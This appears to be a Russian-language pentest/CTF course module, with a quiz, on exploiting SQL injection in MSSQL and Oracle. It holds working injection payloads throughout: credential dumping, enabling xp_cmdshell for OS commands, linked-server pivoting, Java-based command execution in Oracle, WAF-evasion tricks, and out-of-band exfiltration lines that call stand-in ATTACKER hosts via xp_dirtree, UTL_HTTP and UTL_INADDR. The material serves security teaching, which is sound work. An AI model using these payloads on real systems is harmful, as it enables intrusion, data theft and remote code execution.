---
id: web-sqli-dbms-enterprise
title: "Корпоративные СУБД: MSSQL и Oracle"
category: web
parent: web-sqli-dbms
difficulty: hard
order: 2
tags: [sqli, mssql, oracle, xp_cmdshell, utl_http, oob, plsql, dbms]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Пентест внутренних сетей"
  - "Bug bounty"
estimated_minutes: 50
summary: "Модуль-навигатор по двум корпоративным СУБД: MSSQL с xp_cmdshell и linked servers и Oracle с PL/SQL, UTL_HTTP/DNS и OOB-каналами."
---

## Вопрос, с которого всё начинается

Ты нашёл SQL-инъекцию, но привычные приёмы не работают. `SLEEP(5)` не тормозит, `GROUP_CONCAT` вызывает ошибку, а `#` в конце запроса ломает синтаксис. Ошибка выглядит как `Incorrect syntax near '1'`. Это не MySQL и не PostgreSQL — это **корпоративная СУБД**, и здесь всё иначе: другой синтаксис, другие метаданные, но зато и куда более мощные встроенные механизмы, которые при ошибке конфигурации дают полный RCE.

Разберём две главные: **Microsoft SQL Server (MSSQL)** и **Oracle**. Пройдём путь на конкретном примере.

## Наш пример

Возьмём вымышленный корпоративный портал: `https://intranet.t/report?id=1`. В ответе — строка отчёта. Сначала проверим реакцию на задержку:

```
$ curl -s -o /dev/null -w '%{time_total}\n' "https://intranet.t/report?id=1; WAITFOR DELAY '0:0:5'-- -"
5.02
```

Пять секунд ровно. Это характерный признак **MSSQL**: пауза делается через `WAITFOR DELAY`, а не через `SLEEP`.

> **Stacked-запросы** — это возможность выполнить несколько SQL-операторов подряд, разделив их точкой с запятой (`;`). MSSQL это умеет; Oracle — нет.

## Шаг 1: фингерпринт MSSQL против Oracle

Диалект выдаёт себя текстом ошибки и поведением функций.

| Признак | MSSQL | Oracle |
|---------|-------|--------|
| Текст ошибки | `Incorrect syntax near` | `ORA-01756`, `ORA-00933` |
| Конкатенация | `+` или `CONCAT` | `\|\|` или `CONCAT` |
| Пауза | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` |
| Версия | `@@version` | `SELECT banner FROM v$version` |
| Stacked `;` | да | нет (PL/SQL) |
| Метаданные | `information_schema`/`sys` | `all_tables`, `all_tab_columns` |

Проверяем версию и права:

```
$ curl -s "https://intranet.t/report?id=1 UNION SELECT @@version,2-- -"
... Microsoft SQL Server 2019 (RTM) ...
$ curl -s "https://intranet.t/report?id=1 UNION SELECT SYSTEM_USER,IS_SRVROLEMEMBER('sysadmin')-- -"
... sa | 1 ...
```

`IS_SRVROLEMEMBER('sysadmin')` вернул `1` — мы под администратором сервера. Это открывает дорогу к исполнению команд ОС.

> У Oracle неквотированные имена объектов приводятся к ВЕРХНЕМУ регистру: `all_tables` найдётся, а `"all_tables"` в двойных кавычках — уже нет.

## Шаг 2: метаданные и дамп

В MSSQL список баз лежит в системном представлении `sys.databases`.

```
$ curl -s "https://intranet.t/report?id=1 UNION SELECT name,2 FROM sys.databases-- -"
... master, model, msdb, app ...
```

Таблицы и колонки — в `information_schema`:

```
$ curl -s "https://intranet.t/report?id=1 UNION SELECT STRING_AGG(table_name,','),2 FROM information_schema.tables-- -"
... users,orders,audit ...
$ curl -s "https://intranet.t/report?id=1 UNION SELECT STRING_AGG(column_name,','),2 FROM information_schema.columns WHERE table_name='users'-- -"
... id,user,password,role ...
```

`STRING_AGG` — аналог `GROUP_CONCAT`: склеивает строки результата в одну. Дамп:

```
$ curl -s "https://intranet.t/report?id=1 UNION SELECT STRING_AGG(user,':')+':'+STRING_AGG(password,':'),2 FROM users-- -"
... admin:5f4dcc3b5aa765d61d8327deb882cf99:alice:... ...
```

## Шаг 3: MSSQL — от инъекции к RCE

Четыре механизма, каждый по-своему ведёт к коду на сервере.

**`xp_cmdshell`** — прямое исполнение команд ОС. По умолчанию выключен, включаем:

```
$ curl -s "https://intranet.t/report?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -"
$ curl -s "https://intranet.t/report?id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -"
$ curl -s "https://intranet.t/report?id=1; EXEC xp_cmdshell 'whoami'-- -"
... nt authority\system ...
```

`nt authority\system` — это уже RCE с правами системного аккаунта.

**`OPENROWSET(BULK ...)`** читает файлы:

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
```

**`xp_dirtree`** даёт OOB-канал: сервер сам стучится к тебе по SMB/DNS.

```sql
EXEC master..xp_dirtree '\\ATTACKER\share\a';
EXEC master..xp_dirtree '\\data.ATTACKER.oast.pro\a';
```

> **OOB (out-of-band)** — способ вытащить данные, когда в ответе нет ни эха, ни ошибок: база делает исходящий запрос на наш listener, и мы читаем данные из его DNS/HTTP-имени.

**Linked servers** — переход на другой хост домена:

```sql
SELECT * FROM OPENQUERY("DC01", 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT "DC01";
```

## Шаг 4: Oracle — PL/SQL, OOB и RCE

Oracle не умеет stacked-запросы, поэтому план другой: `UNION`, blind или OOB. Метаданные — в `all_*`:

```sql
SELECT banner FROM v$version;
SELECT table_name FROM all_tables;
SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables;
```

Пауза для blind:

```sql
SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 0 END FROM dual;
```

Когда эха нет, Oracle «звонит наружу» через `UTL_HTTP` и `UTL_INADDR`:

```sql
SELECT UTL_HTTP.REQUEST('http://ATTACKER:8000/'||(SELECT banner FROM v$version)) FROM dual;
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.ATTACKER.oast.pro') FROM dual;
```

Разберём на примере. Поднимаем listener и видим обращение:

```
$ curl -s "https://intranet.t/report?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('test.abc123.oast.pro'),2 FROM dual-- -"
# listener:
[abc123.oast.pro] Received DNS interaction from <target-ip>
```

Инъекция подтверждена, хотя в ответе — пусто. Теперь эксфильтруем данные в поддомене:

```
$ curl -s "https://intranet.t/report?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.abc123.oast.pro'),2 FROM dual-- -"
[SYSTEM.abc123.oast.pro] Received DNS interaction
```

Имя пользователя `SYSTEM` уехало в DNS-запрос. RCE в Oracle — через Java-процедуры или `DBMS_SCHEDULER` (нужны права):

```sql
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Cmd" AS
  public class Cmd { public static String run(String c) throws Exception {
    return new java.util.Scanner(Runtime.getRuntime().exec(c).getInputStream()).useDelimiter("\\A").next(); } }
```

## Шаг 5: слепая эксфильтрация по битам

Когда нет ни эха, ни ошибок, ни OOB — данные достают побитово. Сравниваем ASCII-код символа булевым условием:

```sql
AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)) > 100
```

Бинарный поиск (сужение вдвое) сокращает число запросов с ~128 до 7 на символ. Именно так работает `sqlmap --technique=B`; вручную это делают, когда автоматика ломается на нестандартном фильтре.

## Что мы теперь знаем

- MSSQL и Oracle опознаются по ошибке, паузе и stacked-запросам.
- Метаданные MSSQL — `sys.databases`/`information_schema`; Oracle — `all_tables`.
- Склейка строк: `STRING_AGG` (MSSQL) против `LISTAGG` (Oracle).
- RCE: MSSQL — `xp_cmdshell`, Oracle — Java-процедуры/`DBMS_SCHEDULER`.
- OOB: `xp_dirtree` (MSSQL) против `UTL_HTTP`/`UTL_INADDR` (Oracle).

## На что смотреть дальше

- **`xp_cmdshell` выключен** — нужны `sysadmin` и `sp_configure`; иначе `OPENROWSET`/CLR/agent jobs.
- **Регистр в Oracle** — имена объектов в ВЕРХНЕМ регистре, кавычки меняют смысл.
- **WAF на `WAITFOR`/`xp_cmdshell`** — разбивай: `WAITFOR/**/DELAY`, `xp_%63mdshell`, регистр.
- **Нет stacked в Oracle** — планируй `UNION`/blind/OOB, а не `;`-цепочки.
- **Linked servers** — проверяй `sys.servers`, прежде чем считать, что упёрся в тупик.

## Квиз

Проверь себя.

```quiz
- question: "Как организовать задержку (time-based blind) в MSSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY '0:0:5'"
    - "dbms_pipe.receive_message('a',5)"
  answer: 2
  explanation: "В MSSQL пауза делается через WAITFOR DELAY; dbms_pipe — это Oracle."
- question: "Где в Oracle хранится список таблиц и колонок?"
  options:
    - "sqlite_master"
    - "all_tables и all_tab_columns"
    - "pg_catalog"
    - "sys.objects"
  answer: 1
  explanation: "В Oracle привычного information_schema нет — метаданные в all_tables/all_tab_columns."
- question: "Чем Oracle утечёт данные, когда в ответе нет эха (out-of-band)?"
  options:
    - "Через UTL_HTTP/UTL_INADDR, отправив запрос или DNS-имя на listener"
    - "Через INTO OUTFILE"
    - "Через xp_dirtree"
    - "Через ATTACH DATABASE"
  answer: 0
  explanation: "UTL_HTTP/UTL_INADDR дают OOB-канал; xp_dirtree — MSSQL, INTO OUTFILE — MySQL, ATTACH — SQLite."
- question: "Какая функция агрегирует строки в MSSQL?"
  options:
    - "GROUP_CONCAT"
    - "STRING_AGG"
    - "LISTAGG"
    - "string_agg"
  answer: 1
  explanation: "STRING_AGG — MSSQL; GROUP_CONCAT — MySQL/SQLite, LISTAGG — Oracle."
- question: "Почему на Oracle не сработает цепочка вида id=1; EXEC ...?"
  options:
    - "Oracle запрещает UNION"
    - "Oracle не поддерживает stacked-запросы через точку с запятой"
    - "В Oracle нет функции EXEC"
    - "Oracle блокирует комментарии"
  answer: 1
  explanation: "Oracle не выполняет несколько операторов подряд через ; — нужны UNION/blind/OOB."
```

## Куда дальше

Теперь ты умеешь определять диалект и выбирать под него стратегию. Дальше мы возьмём инструмент, который делает всё это автоматически, — **sqlmap**: как передать ему запрос, как заставить работать с нужной СУБД и как вытащить данные, когда ручные payload не проходят. А пока главное запомни: **корпоративная СУБД — это не «сложнее», а «иначе»**, и её встроенные механизмы могут дать RCE быстрее, чем открытая.

## Где пригодится

- **CTF (Web):** задачи на MSSQL/Oracle встречаются реже, но дают максимум очков за RCE и OOB.
- **Пентест внутренних сетей:** MSSQL с `xp_cmdshell` и linked servers — типичный шаг к хосту и домену.
- **Bug bounty:** корпоративные порталы часто на Oracle/MSSQL; правильный диалект превращает «ошибку» в критичный отчёт.
- **Работа (AppSec/IR):** понимание, где включён опасный функционал (`xp_cmdshell`, Java procs), критично при hardening.
